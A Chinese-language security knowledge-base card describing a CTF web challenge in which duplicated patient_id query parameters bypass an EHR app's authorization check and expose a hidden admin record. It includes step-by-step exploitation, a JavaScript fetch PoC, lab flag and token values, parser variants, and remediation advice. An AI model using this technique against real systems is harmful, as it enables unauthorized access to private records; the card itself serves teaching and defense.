---
id: web-generic-auth-hpp-duplicate-param-auth-data-mismatch
title: HTTP 重复参数污染：鉴权取第一个 patient_id、取数取最后一个，读隐藏 SYS-ADMIN 记录
type: scenario
domain: web
path: web/generic/auth
technique: hpp-duplicate-param-auth-data-mismatch
tags:
- web
- auth
- hpp
- parameter-pollution
- idor
- nodejs
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V124
  verified_at: '2026-11-06T04:22:37+08:00'
  notes: 已对照原文与图04/06/08/10核对：前端 JS 暴露 SYS-ADMIN record/admin_access_code/action=verify、重复参数 patient_id=PT-1001&patient_id=SYS-ADMIN 读隐藏记录（图06 返回 admin_access_code=a029a028a027a026）、POST verify 换 admin_token=cdaaa20a86340104723d257d4d4bfde0（图08）、claim 得 SDG{c9dbd007298d92f9906a519fdf4ff24f}（图10）均一致。未验证点：无靶机，PoC 未复跑；原文无版本信息；frontmatter 无 sources/source_url。
url: /docs/web/generic/auth/web-generic-auth-hpp-duplicate-param-auth-data-mismatch/
draft: false
kb_aliases:
- HPP
- 重复参数污染
- patient_id 重复
- 鉴权取第一个
- 取数取最后一个
- SYS-ADMIN
- EHR Parameter Pollution
---

## 一句话结论

同一 query 里放两个 `patient_id`（`PT-1001` 与 `SYS-ADMIN`），鉴权/取数两段代码分别取第一个和最后一个，导致以普通患者身份通过校验却读取管理员记录。

## 原理

- **HTTP 参数污染（HPP）**：`?patient_id=PT-1001&patient_id=SYS-ADMIN` 中同名参数出现两次；不同解析器/不同代码路径取值不同：有的取第一个、有的取最后一个、有的变成数组。
- **鉴权与取数不一致**：后端可能用 `req.query.patient_id[0]` 或先解析出的第一个值做权限判断（`PT-1001` 属于当前用户），而实际查询用 `[length-1]` 或对象键覆盖后的最后一个值（`SYS-ADMIN`），于是“检查的是 A、操作的是 B”。
- **前端泄露目标语义**：前端 JS 注释/变量名直接写 `SYS-ADMIN record`、`admin_access_code`，说明隐藏记录 ID 不是 `PT-10xx` 连续患者号，而是管理员风格 ID。
- **完整链**：读隐藏记录拿到 `admin_access_code` → POST `action=verify` 换取 `admin_token` → 用 token claim flag。

## 触发条件

- 服务端接受重复 query/body 参数，且鉴权与业务查询使用不同的取值方式。
- 目标对象 ID 可猜或从前端/提示泄露（如 `SYS-ADMIN`）。
- 对象级授权只在“第一个参数”上做，后续查询用“最后一个参数”。

## 利用步骤

1. 审计前端 JS，找隐藏记录语义（`SYS-ADMIN`、`admin_access_code`、`action=verify`）。
2. 构造 `?seed=<seed>&patient_id=PT-1001&patient_id=SYS-ADMIN`，保持第一个是合法患者 ID 通过鉴权，最后一个指向目标记录。
3. 从响应读取隐藏记录与 `admin_access_code`。
4. POST `?seed=<seed>&action=verify`，body `{"admin_access_code":"..."}`，拿 `admin_token`/proof。
5. 用 proof 调 claim 接口取 flag。

## PoC

```javascript
// 1) 用重复参数读隐藏记录
const seed = "...";
const r1 = await fetch(`/api/ehr-param-pollution?seed=${seed}&patient_id=PT-1001&patient_id=SYS-ADMIN`, {
  credentials: "omit", cache: "no-store"
}).then(r => r.json());
const code = r1.record.admin_access_code;

// 2) verify 换 token
const r2 = await fetch(`/api/ehr-param-pollution?seed=${seed}&action=verify`, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ admin_access_code: code }),
  credentials: "omit", cache: "no-store"
}).then(r => r.json());
console.log(r2.admin_token);
```

## 变体与关联

- **参数位置变体**：query、body（JSON 重复键/表单重复字段）、header（重复 `X-User-Id`）、cookie。
- **解析器变体**：Express `qs` 默认数组、`URLSearchParams.get` 取第一个、PHP 取最后一个、Spring `@RequestParam` 取第一个；数组参数 `patient_id[]=`、分号分隔、编码后的 `&`。
- **逻辑变体**：鉴权用 JWT 里的 userId、业务用请求参数；鉴权用第一个、查询用最后一个；中间件与控制器各解析一次。
- **关联卡片**：[[web-generic-auth-roleid-roleids-parameter-tampering-admin]]（角色参数篡改）、[[web-generic-auth-cgi-login-auth-param-session-bypass]]（参数直接建会话）、[[ctf-web-ezlog-prototype-inherited-nonce-query-array-traversal]]（query 数组遍历）。
- **边界**：若框架/网关强制去重、拒绝重复参数，或鉴权与查询使用同一解析结果，本链不成立。

## 检测与防御

- **CTF/审计验证**：先确认重复参数在响应中生效，再对比鉴权与查询取值；用合法 ID 通过鉴权、目标 ID 取数。
- **修复**：入口层拒绝重复参数或统一取第一个/最后一个；鉴权与业务查询使用同一个已解析对象；对象级授权（检查目标对象是否属于当前用户），而不是只校验第一个参数。
- **检测信号**：请求中出现同名参数多次、数组参数、`patient_id[]`；同一请求鉴权通过但访问了非本人对象；前端代码泄露隐藏 ID。
